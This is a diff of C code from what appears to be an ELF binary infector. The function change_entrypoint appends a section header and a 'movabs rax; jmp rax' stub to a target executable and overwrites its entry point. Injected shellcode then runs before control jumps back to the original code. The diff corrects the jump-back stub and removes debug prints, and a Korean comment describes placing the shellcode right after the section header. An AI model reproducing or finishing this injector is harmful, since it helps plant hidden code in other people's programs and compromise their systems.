@@ -151,33 +151,20 @@ void change_entrypoint(const char* fpath, char *newaddr){
 	printf("[NEW] shellcodeloc(0x%x) = hdr.sh_addr(0x%x) + shdr.sh_offset(0x%x)\n",shellcodeloc, shdr.sh_addr, shdr.sh_offset);
 	
 	printf("[BEFORE] Entry point (%s): 0x%x\n", fpath, ehdr.e_entry);
-	printf("[BEFORE] ehdr.e_entry : 0x%01x(0x%x)\n" ,*(&ehdr.e_entry+0), &ehdr.e_entry+0);
-	printf("[BEFORE] ehdr.e_entry : 0x%01x(0x%x)\n" ,*(&ehdr.e_entry+1), &ehdr.e_entry+1);
-	printf("[BEFORE] ehdr.e_entry : 0x%01x(0x%x)\n" ,*(&ehdr.e_entry+2), &ehdr.e_entry+2);
-	printf("[BEFORE] ehdr.e_entry : 0x%01x(0x%x)\n" ,*(&ehdr.e_entry+3), &ehdr.e_entry+3);
-	printf("[BEFORE] ehdr.e_entry : 0x%01x(0x%x)\n" ,*(&ehdr.e_entry+4), &ehdr.e_entry+4);
-	printf("[BEFORE] ehdr.e_entry : 0x%01x(0x%x)\n" ,*(&ehdr.e_entry+5), &ehdr.e_entry+5);
-	printf("[BEFORE] ehdr.e_entry : 0x%01x(0x%x)\n" ,*(&ehdr.e_entry+6), &ehdr.e_entry+6);
-	printf("[BEFORE] ehdr.e_entry : 0x%01x(0x%x)\n" ,*(&ehdr.e_entry+7), &ehdr.e_entry+7);
-	
+
 	lseek(fd,0,SEEK_END); 
 	write(fd, &shdr, sizeof(shdr));
 	
 	/* 48 b8 41 41 41 41 41 41 41 41	movabs rax,0x4141414141414141 */
 	jmp2original[0] = 0x48;
 	jmp2original[1] = 0xb8;
-	jmp2original[2] = *(&(ehdr.e_entry)+0);
-	jmp2original[3] = *(&(ehdr.e_entry)+1);
-	jmp2original[4] = *(&(ehdr.e_entry)+2);
-	jmp2original[5] = *(&(ehdr.e_entry)+3);
-	jmp2original[6] = *(&(ehdr.e_entry)+4);
-	jmp2original[7] = *(&(ehdr.e_entry)+5);
-	jmp2original[8] = *(&(ehdr.e_entry)+6);
-	jmp2original[9] = *(&(ehdr.e_entry)+7);
-	/*ff 20	jmp    QWORD PTR [rax]*/
-	jmp2original[10] = 0xff;
-	jmp2original[11] = 0x20;
+	memcpy(&jmp2original[2], &ehdr.e_entry, sizeof(ehdr.e_entry));
 	
+	/* ff e0	jmp    rax */
+	jmp2original[10] = 0xff;
+	jmp2original[11] = 0xe0;
+	
+	// 섹션헤더끝나고 바로쉘코드집어넣기. lseek필요없음
 	write(fd,jmp2original,sizeof(jmp2original));
 	
 	//Entry point overwriting routine.. Don't touch it!
